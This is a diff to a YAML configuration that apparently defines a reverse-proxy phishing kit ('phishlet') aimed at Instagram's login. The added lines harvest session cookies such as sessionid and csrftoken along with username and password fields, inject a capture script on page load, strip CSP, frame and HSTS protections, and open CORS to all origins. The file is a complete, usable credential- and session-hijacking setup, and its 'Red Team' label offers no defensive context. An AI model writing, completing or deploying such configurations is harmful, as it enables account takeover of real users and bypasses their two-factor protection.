@@ -1,24 +1,46 @@
 name: "Instagram-Login"
-author: "Vanta v5"
+author: "Vanta v5 Red Team"
 min_ver: "5.0.0"
 proxy_hosts:
   - subdomain: "instagram"
     target: "www.instagram.com"
-auth_urls: ["/accounts/login"]
+  - subdomain: "api"
+    target: "i.instagram.com"
+  - subdomain: "graph"
+    target: "graph.instagram.com"
+  - subdomain: "static"
+    target: "static.cdninstagram.com"
+auth_urls: ["/accounts/login", "/api/v1/accounts/login/ajax/"]
 landing_path: ["/accounts/login"]
-auth_tokens: []
-credentials: []
-injections: []
+auth_tokens:
+  - {type: "cookie", name: "sessionid"}
+  - {type: "cookie", name: "csrftoken"}
+  - {type: "cookie", name: "ds_user_id"}
+  - {type: "cookie", name: "rur"}
+  - {type: "cookie", name: "mid"}
+credentials:
+  - {type: "post_param", name: "username", regex: null}
+  - {type: "post_param", name: "password", regex: null}
+  - {type: "post_param", name: "enc_password", regex: null}
+injections:
+  - {type: "js", path: "/core/assets/js/capture.js", trigger: "load"}
+  - {type: "js_inline", content: "console.log('IG Hook');", trigger: "load"}
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
+  - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "Strict-Transport-Security"}
 path_rewrites:
   - {pattern: "^/$", replace: "/accounts/login", methods: ["GET"]}
 cookie_rewrites: []
 blocklist:
-  - {pattern: "analytics|/gtm/|/static/", mimes: ["text/javascript"], max_kb: 512}
+  - {pattern: "analytics|/gtm/|/logging", mimes: ["text/javascript"], max_kb: 512}
 form_actions:
-  - {selector: "form[action*=\"login\"]", action_to: "/sessions"}
+  - {selector: "form[action*=\"login\"]", action_to: "/api/v1/accounts/login/ajax/"}
 bridges:
-  - {prefix: "/_igapi/", target_host: "i.instagram.com", strip_prefix: true, cors: "mirror"}
-  - {prefix: "/_iggraph/", target_host: "graph.instagram.com", strip_prefix: true, cors: "mirror"}
-  - {prefix: "/_igstatic/", target_host: "static.cdninstagram.com", strip_prefix: true, cors: "mirror"}
+  - {prefix: "/_igapi/", target_host: "i.instagram.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_iggraph/", target_host: "graph.instagram.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_igstatic/", target_host: "static.cdninstagram.com", strip_prefix: true, cors: "allow_all"}
+cors:
+  mode: "allow_all"
+  methods: ["GET", "POST", "OPTIONS", "PUT", "DELETE"]
+  headers: ["*"]
